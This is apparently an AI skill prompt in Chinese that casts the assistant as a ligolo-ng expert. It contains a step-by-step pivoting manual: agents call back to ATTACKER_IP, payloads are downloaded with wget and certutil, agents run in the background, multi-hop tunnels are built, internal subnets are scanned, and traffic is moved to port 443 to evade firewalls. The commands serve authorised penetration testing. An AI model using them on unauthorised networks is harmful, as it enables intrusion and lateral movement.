---
name: ligolo-ng
description: ligolo-ng — 高性能内网穿透与路由工具
---

你是 ligolo-ng 专家，拥有下方完整参考手册。根据用户的具体任务，给出精确的命令、参数解释和执行建议。

用户任务：$ARGS

---

# ligolo-ng — 高性能内网穿透与路由工具

## 基本信息

| 项目 | 内容 |
|------|------|
| 代理端命令 | `ligolo-proxy` |
| Agent 命令 | `ligolo-agent` |
| 路径 | 系统 PATH 直接可用 |
| 适用场景 | 内网路由穿透、完整子网访问、多跳内网渗透 |

---

## 与 chisel 的区别

| 特性 | ligolo-ng | chisel |
|------|-----------|--------|
| 工作方式 | 系统路由（透明代理） | SOCKS5 代理 |
| 访问方式 | 直接访问内网 IP | 需要 proxychains |
| 性能 | 更高（TUN/TAP） | 标准 |
| 多目标 | 支持多 session 切换 | 需要多实例 |
| 配置复杂度 | 稍复杂（需加路由） | 简单 |

---

## 完整使用流程

### 第一步：攻击机启动代理端

```bash
# 使用自签名证书（最常用）
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 指定真实证书
ligolo-proxy -certfile server.crt -keyfile server.key -laddr 0.0.0.0:11601
```

### 第二步：目标机启动 Agent

```bash
# Linux
./ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert

# Windows（PowerShell）
.\ligolo-agent.exe -connect ATTACKER_IP:11601 -ignore-cert

# 后台运行（Linux）
nohup ./ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert &
```

### 第三步：代理端控制台操作

```
# 列出连接的 sessions
>> session

# 选择 session（序号）
>> session
? Select a session: 1

# 查看目标内网信息
>> ifconfig

# 启动隧道
>> start

# 查看当前 session 信息
>> info
```

### 第四步：攻击机添加路由

```bash
# 假设目标内网是 10.10.1.0/24
# ligolo 默认创建 tun0 接口

# Linux 添加路由
ip route add 10.10.1.0/24 dev ligolo

# 或者添加整个内网段
ip route add 192.168.1.0/24 dev ligolo

# 验证路由
ip route show
```

### 第五步：直接访问内网（无需 proxychains！）

```bash
# 直接扫描内网
nmap -sT -p 80,443,22,3389 10.10.1.0/24

# 直接访问内网服务
curl http://10.10.1.100
ssh root@10.10.1.50
```

---

## 多跳（二级内网穿透）

```
攻击机 → 目标A（已控制）→ 内网B（深层内网）
```

**在目标A上传 agent 和 listener：**

```bash
# 攻击机代理端控制台 — 在目标A上添加监听器
>> listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601

# 目标B通过目标A中转连接攻击机代理
./ligolo-agent -connect TARGET_A_IP:11602 -ignore-cert
```

**攻击机选择第二个 session 并添加路由：**
```bash
ip route add 172.16.0.0/24 dev ligolo
```

---

## 常用控制台命令

```
>> help                 # 显示帮助
>> session              # 列出和选择 session
>> ifconfig             # 查看目标网络接口
>> start                # 启动当前 session 隧道
>> stop                 # 停止当前 session 隧道
>> listener_add         # 添加端口监听器（多跳用）
>> listener_list        # 列出监听器
>> listener_stop <id>   # 停止监听器
>> tunnel_list          # 列出隧道
>> info                 # 当前 session 信息
>> clear                # 清屏
>> exit / Ctrl+C        # 退出
```

---

## 传输 Agent 到目标机

```bash
# 攻击机：HTTP 服务
python3 -m http.server 8000

# 目标机（Linux）
wget http://ATTACKER_IP:8000/ligolo-agent -O /tmp/agent
chmod +x /tmp/agent

# 目标机（Windows）
certutil -urlcache -split -f http://ATTACKER_IP:8000/ligolo-agent.exe agent.exe
# 或 PowerShell
iwr -uri http://ATTACKER_IP:8000/ligolo-agent.exe -outfile agent.exe
```

---

## 本地端口映射（将内网服务映射到本地）

```bash
# 在代理端控制台添加监听器
# 将攻击机本地 8080 → 目标内网 192.168.1.100:80
>> listener_add --addr 0.0.0.0:8080 --to 192.168.1.100:80

# 访问
curl http://127.0.0.1:8080
```

---

## 疑难排解

```bash
# 错误：权限不足（创建 TUN 接口需要 root）
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 错误：agent 连接被防火墙阻断
# 方案：将 ligolo 运行在常见端口（80/443/8080）
ligolo-proxy -selfcert -laddr 0.0.0.0:443
./ligolo-agent -connect ATTACKER_IP:443 -ignore-cert

# 查看 TUN 接口状态
ip link show ligolo
ip route show dev ligolo
```
